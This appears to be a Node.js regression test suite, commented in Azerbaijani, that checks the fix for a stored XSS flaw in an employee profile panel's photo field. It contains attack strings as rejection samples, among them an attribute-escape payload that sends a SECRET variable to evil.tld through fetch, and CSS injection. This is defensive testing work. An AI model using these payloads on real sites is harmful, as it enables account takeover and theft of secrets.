'use strict';
// ══════════════════════════════════════════════════════════════════════════
//  PROFİL — SAXLANAN XSS VƏ DƏYƏR YOXLANIŞI  (F-09)
// ══════════════════════════════════════════════════════════════════════════
//  Bu testlərin cavab verdiyi sual: "işçi həmkarının kartını ələ keçirə bilərmi?"
//
//  `saveProfile` `photoData`-nı OLDUĞU KİMİ yazırdı — nə format, nə ölçü
//  yoxlaması. İşçi kartı isə onu belə göstərirdi:
//
//      avEl.innerHTML = '<img src="' + p.photoData + '" …>'
//
//  Yəni `photoData` kimi `" onerror="…` göndərmək kifayət idi: kod HƏMİN
//  filialdakı bütün həmkarların brauzerində işləyirdi və orada `SECRET`
//  dəyişəni var. Bir işçi başqasının kartına (gəliş, cərimə, maaş) çıxış
//  əldə edə bilərdi.
//
//  ⚠️ İKİ QAT bağlandı və hər ikisi ayrıca yoxlanılır:
//     4-cü bölmə — server belə dəyəri QƏBUL ETMİR (davranış testi);
//     5-ci bölmə — panel `innerHTML` İŞLƏTMİR (mənbə yoxlaması).
//     Biri sınsa digəri saxlayır, ona görə ikisi də lazımdır.
//
//      node test-profile.js
// ══════════════════════════════════════════════════════════════════════════

process.env.TZ = process.env.TZ || 'Asia/Baku';
process.env.SUPABASE_URL = process.env.SUPABASE_URL || 'http://test.local';
process.env.SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || 'test';

const fake = require('./test-fakedb').install();
const T = require('./tenant');
const U = require('./utils');
const { API } = require('./server');

let pass = 0, fail = 0;
function ok(cond, label, detail) {
  if (cond) { pass++; console.log(`  ✓ ${label}`); }
  else      { fail++; console.log(`  ✗ ${label}${detail ? '\n      → ' + detail : ''}`); }
}
const section = (t) => console.log(`\n── ${t} ${'─'.repeat(Math.max(0, 52 - t.length))}`);

T.__testSeed({
  tenants:  [{ tenant_id: 'cm', name: 'Test', status: 'active', plan: 'pro' }],
  branches: [{ tenant_id: 'cm', branch_id: 'elmler', name: 'Elmlər', active: true, sort_order: 0 }],
});
const inCm = (fn) => T.run({ tenantId: 'cm', role: 'system', branchId: null }, fn);

const SEED = {
  employees: [{ tenant_id: 'cm', id: 'E1', name: 'Aysel', dept: 'Elmlər', secret: 'S1' }],
  profiles:  [],
};
const prof = () => (fake.store.profiles || [])[0];

// Panelin öz sıxıcısının çıxışı (160×160 JPEG) — qanuni dəyər budur.
const YAXSI = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAg=';

console.log('\n══ PROFİL TESTLƏRİ ══');

(async () => {

// ══════════════════════════════════════════════════════════════════════════
section('1. Qanuni şəkil qəbul olunur');
{
  ok(U.photoDataError(YAXSI) === null, 'panelin öz çıxışı (JPEG) keçir');
  ok(U.photoDataError('') === null, 'boş dəyər normaldır (şəkilsiz profil)');
  ok(U.photoDataError(null) === null, 'null normaldır');
  ok(U.photoDataError('data:image/png;base64,iVBORw0KGgo=') === null, 'PNG keçir');
  ok(U.photoDataError('data:image/webp;base64,UklGRh4AAABXRUJQ') === null, 'WebP keçir');
}

// ══════════════════════════════════════════════════════════════════════════
section('2. ⚠️ Hücum yükləri rədd olunur (F-09-un özü)');
{
  // Sətir `<img src="…">` atribut kontekstinə düşürdü → dırnaqdan çıxıb
  // hadisə atributu əlavə etmək kifayət idi.
  const XSS = 'x" onerror="fetch(\'//evil.tld/?k=\'+SECRET)" data-x="';
  ok(U.photoDataError(XSS) !== null, 'atributdan qaçan yük RƏDD olunur', U.photoDataError(XSS));

  for (const bad of [
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+',
    'data:image/jpeg;base64,abc<script>',
    'http://evil.tld/x.jpg',
  ]) {
    ok(U.photoDataError(bad) !== null, `rədd: ${bad.slice(0, 42)}…`);
  }

  // SVG qəsdən siyahıda yoxdur — brauzerdən brauzerə davranışı fərqlidir,
  // panelin sıxıcısı isə onu heç vaxt yaratmır.
  ok(U.photoDataError('data:image/svg+xml;base64,PHN2Zy8+') !== null, 'SVG icazəli deyil');
}

// ══════════════════════════════════════════════════════════════════════════
section('3. Ölçü limiti');
{
  const boyuk = 'data:image/jpeg;base64,' + 'A'.repeat(U.PHOTO_MAX_CHARS);
  const err = U.photoDataError(boyuk);
  ok(err !== null, 'limitdən böyük şəkil rədd olunur');
  ok(/KB/.test(err || ''), 'səbəbdə ölçü göstərilir', err);
  ok(U.PHOTO_MAX_CHARS >= 100 * 1024,
     'limit qanuni şəkil üçün genişdir (panel 5–12 KB verir)', U.PHOTO_MAX_CHARS + ' bayt');
}

// ══════════════════════════════════════════════════════════════════════════
section('4. saveProfile — davranış');
{
  fake.reset(SEED);
  const bad = await inCm(() => API.saveProfile('S1', {
    avatarType: 'photo',
    photoData: 'x" onerror="alert(1)" y="',
  }));
  ok(!bad.success, 'hücum yükü ilə saxlama UĞURSUZDUR', JSON.stringify(bad));
  ok(!!bad.reason, 'işçi səbəbi görür (səssiz boşaltma yox)', bad.reason);
  ok(!prof(), 'bazada heç bir profil sətri yaranmadı');

  fake.reset(SEED);
  const good = await inCm(() => API.saveProfile('S1', {
    avatarType: 'photo', photoData: YAXSI, accentColor: '#ff8800', bio: 'Salam',
    cardTheme: 'coffee', frameStyle: 'rainbow_anim',
  }));
  ok(good.success, 'qanuni profil saxlanılır', JSON.stringify(good));
  ok(prof().photo_data === YAXSI, 'şəkil olduğu kimi yazıldı');
  ok(prof().accent_color === '#ff8800', 'seçilmiş rəng qorunur');
  ok(prof().card_theme === 'coffee' && prof().frame_style === 'rainbow_anim', 'tema/çərçivə qorunur');

  // CSS-ə düşən dəyərlər
  fake.reset(SEED);
  await inCm(() => API.saveProfile('S1', {
    accentColor: 'red; background:url(//evil.tld)',
    cardTheme: '"><script>x</script>',
    frameStyle: 'a'.repeat(200),
  }));
  ok(prof().accent_color === '#5b5ef4', 'CSS injeksiyalı rəng ilkin dəyərə düşür', prof().accent_color);
  ok(prof().card_theme === 'glass', 'teqli tema adı ilkin dəyərə düşür', prof().card_theme);
  ok(prof().frame_style === 'none', 'həddən uzun çərçivə adı ilkin dəyərə düşür');

  // ⚠️ `'var(--primary)'` — panel profil hələ yoxkən BUNU göndərirdi.
  // `hexToRgba('var(--primary)')` → NaN → hero qradiyenti SƏSSİZCƏ sınırdı.
  fake.reset(SEED);
  await inCm(() => API.saveProfile('S1', { accentColor: 'var(--primary)' }));
  ok(prof().accent_color === '#5b5ef4',
     "'var(--primary)' hex-ə çevrilir (hexToRgba NaN verirdi)", prof().accent_color);

  // Preset seçiləndə köhnə base64 qalmamalıdır — `getTeamProfiles` onu
  // hər çağırışda hamıya daşıyır (F-21).
  fake.reset(SEED);
  await inCm(() => API.saveProfile('S1', { avatarType: 'photo', photoData: YAXSI }));
  ok(prof().photo_data === YAXSI, 'əvvəlcə şəkil var');
  await inCm(() => API.saveProfile('S1', { avatarType: 'preset', avatarValue: 'mug-hot', photoData: YAXSI }));
  ok(prof().photo_data === '', 'preset seçiləndə şəkil TƏMİZLƏNİR');

  // Naməlum secret
  fake.reset(SEED);
  const nope = await inCm(() => API.saveProfile('YOXDUR', { bio: 'x' }));
  ok(!nope.success, 'naməlum secret ilə profil yazılmır');
  ok(!prof(), 'sətir yaranmadı');
}

// ══════════════════════════════════════════════════════════════════════════
section('4b. F-21 — komanda siyahısı MİNİK daşıyır');
{
  //  `getTeamProfiles` hər işçinin TAM şəklini qaytarırdı: produksiyada
  //  19 işçi / 9 şəkil = 105 KB, hər profil tabı açılışında.
  const TAM   = 'data:image/jpeg;base64,' + 'A'.repeat(12 * 1024);   // ~12 KB
  const MINIK = 'data:image/jpeg;base64,' + 'B'.repeat(1200);        // ~1.2 KB

  fake.reset({
    employees: [
      { tenant_id: 'cm', id: 'E1', name: 'Aysel', dept: 'Elmlər', secret: 'S1' },
      { tenant_id: 'cm', id: 'E2', name: 'Rəşad', dept: 'Elmlər', secret: 'S2' },
    ],
    profiles: [
      { tenant_id: 'cm', emp_id: 'E1', avatar_type: 'photo', avatar_value: '',
        accent_color: '#5b5ef4', bio: '', photo_data: TAM, photo_thumb: MINIK },
      //  Miniyi HƏLƏ olmayan köhnə profil — üzü itməməlidir.
      { tenant_id: 'cm', emp_id: 'E2', avatar_type: 'photo', avatar_value: '',
        accent_color: '#5b5ef4', bio: '', photo_data: TAM, photo_thumb: '' },
    ],
  });

  const team = await inCm(() => API.getTeamProfiles('S1'));
  const a = team.find(x => x.empId === 'E1');
  const b = team.find(x => x.empId === 'E2');

  ok(a.photoData === MINIK, '⚠️ miniyi olan işçi üçün siyahıda MİNİK gedir (tam şəkil yox)');
  ok(!a.photoData.includes('A'.repeat(100)), 'tam şəkil siyahıya düşmür');
  ok(b.photoData === TAM, 'miniyi OLMAYAN köhnə profil tam şəklə geri düşür (üz itmir)');
  ok(b.thumbMissing === true, 'sahibinə «miniyin yoxdur» siqnalı verilir');
  ok(a.thumbMissing === false, 'miniyi olanda siqnal yoxdur');

  //  Ölçü: iki nəfərin biri minikli → cavab təxminən yarıya düşür.
  const olcu = JSON.stringify(team).length;
  ok(olcu < 2 * TAM.length, `cavab iki tam şəkildən kiçikdir (${Math.round(olcu/1024)} KB)`);

  //  Tam şəkil profil pəncərəsində HƏLƏ DƏ gəlir — orada lazımdır.
  const tek = await inCm(() => API.getPublicProfile('S1', 'E1'));
  ok(tek && tek.photoData === TAM, 'profil pəncərəsi tam şəkli alır');

  //  Saxlama: minik yoxlanılır, səhv olsa səssizcə boşalır (istifadəçinin
  //  seçimi deyil — panelin öz çıxışıdır, ona görə saxlama dayanmır).
  fake.reset({ employees: [{ tenant_id: 'cm', id: 'E1', name: 'Aysel', dept: 'Elmlər', secret: 'S1' }], profiles: [] });
  const r1 = await inCm(() => API.saveProfile('S1', { avatarType: 'photo', photoData: YAXSI, photoThumb: MINIK }));
  ok(r1.success && prof().photo_thumb === MINIK, 'düzgün minik saxlanılır');

  fake.reset({ employees: [{ tenant_id: 'cm', id: 'E1', name: 'Aysel', dept: 'Elmlər', secret: 'S1' }], profiles: [] });
  const r2 = await inCm(() => API.saveProfile('S1', { avatarType: 'photo', photoData: YAXSI, photoThumb: TAM }));
  ok(r2.success, 'həddi aşan minik SAXLAMANI dayandırmır');
  ok(prof().photo_thumb === '', 'həddi aşan minik boşaldılır', String(prof().photo_thumb).slice(0, 20));

  fake.reset({ employees: [{ tenant_id: 'cm', id: 'E1', name: 'Aysel', dept: 'Elmlər', secret: 'S1' }], profiles: [] });
  await inCm(() => API.saveProfile('S1', { avatarType: 'photo', photoData: YAXSI, photoThumb: 'x" onerror="alert(1)' }));
  ok(prof().photo_thumb === '', 'hücum yükü minik kimi də keçmir');

  //  Preset seçiləndə minik də təmizlənir
  fake.reset({ employees: [{ tenant_id: 'cm', id: 'E1', name: 'Aysel', dept: 'Elmlər', secret: 'S1' }], profiles: [] });
  await inCm(() => API.saveProfile('S1', { avatarType: 'photo', photoData: YAXSI, photoThumb: MINIK }));
  await inCm(() => API.saveProfile('S1', { avatarType: 'preset', avatarValue: 'mug-hot' }));
  ok(prof().photo_thumb === '' && prof().photo_data === '', 'preset seçiləndə şəkil də, minik də təmizlənir');

  //  Panel tərəfi: minik yaradılması və geriyə doldurma mövcuddur.
  const src = require('fs').readFileSync(require('path').join(__dirname, 'public', 'mycode.html'), 'utf8');
  ok(/_editPhotoThumb\s*=\s*minikSec\(_editPhotoData,\s*kicilt\(/.test(src),
     'panel şəkli saxlayanda minik də yaradır');
  ok(/photoThumb:\s*_editAvatarType/.test(src), 'minik saxlama yükünə əlavə olunur');
  ok(/function minikGeriDoldur/.test(src) && /minikGeriDoldur\(p\)/.test(src),
     'mövcud şəkillər üçün geriyə doldurma var');
  //  ⚠️ Brauzer yoxlaması bir incəlik göstərdi: onsuz da balaca şəkil yenidən
  //  kodlananda BÖYÜYÜR (471 → 1099 bayt). Minik yalnız həqiqətən kiçikdirsə
  //  saxlanılır; əks halda siyahı tam şəkli daşıyır — o, onsuz da kiçikdir.
  ok(/function minikSec/.test(src) && /minikSec\(_editPhotoData/.test(src) && /minikSec\(p\.photoData/.test(src),
     'minik yalnız faydalı olanda saxlanılır (hər iki yolda)');
}

// ══════════════════════════════════════════════════════════════════════════
section('5. Panel: `innerHTML` sink-i qalmayıb');
{
  const fs = require('fs'), path = require('path');
  const src = fs.readFileSync(path.join(__dirname, 'public', 'mycode.html'), 'utf8');

  const sinks = src.split('\n')
    .map((l, i) => [i + 1, l])
    .filter(([, l]) => /innerHTML\s*[+]?=/.test(l) && /photoData/.test(l));
  ok(sinks.length === 0,
     'photoData heç bir yerdə innerHTML-ə verilmir',
     sinks.map(([n, l]) => `${n}: ${l.trim()}`).join('\n      → '));

  // Şəkil DOM ilə qurulmalıdır — `img.src = …` atribut konteksti yaratmır.
  ok(/pImg\.src\s*=\s*p\.photoData/.test(src) || /img\.src\s*=\s*photoData/.test(src),
     'şəkil `img.src` ilə verilir');

  // `hexToRgba` yalnız hex qəbul edir; 'var(--primary)' ona getməməlidir.
  const varAccent = src.split('\n')
    .map((l, i) => [i + 1, l])
    .filter(([, l]) => /accentColor\s*\|\|\s*'var\(--primary\)'/.test(l));
  ok(varAccent.length === 0,
     "accentColor ehtiyat dəyəri hex-dir ('var(--primary)' deyil)",
     varAccent.map(([n]) => n).join(', '));
}

// ══════════════════════════════════════════════════════════════════════════
console.log(`\n${'═'.repeat(62)}`);
console.log(fail === 0
  ? `🎉  BÜTÜN TESTLƏR KEÇDİ  (${pass}/${pass})`
  : `❌  ${fail} TEST UĞURSUZ  (${pass}/${pass + fail} keçdi)`);
console.log(`${'═'.repeat(62)}\n`);
process.exit(fail === 0 ? 0 : 1);

})().catch(e => { console.error('\n💥  Test çöküb:', e); process.exit(1); });
